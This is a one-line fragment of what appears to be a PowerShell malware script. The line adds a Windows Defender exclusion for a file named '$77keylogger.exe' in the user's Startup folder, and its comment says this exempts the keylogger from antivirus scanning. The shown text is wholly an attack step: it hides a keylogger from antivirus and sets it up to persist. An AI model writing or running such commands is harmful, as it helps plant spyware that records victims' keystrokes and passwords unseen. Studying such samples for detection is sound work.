...
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\$77keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
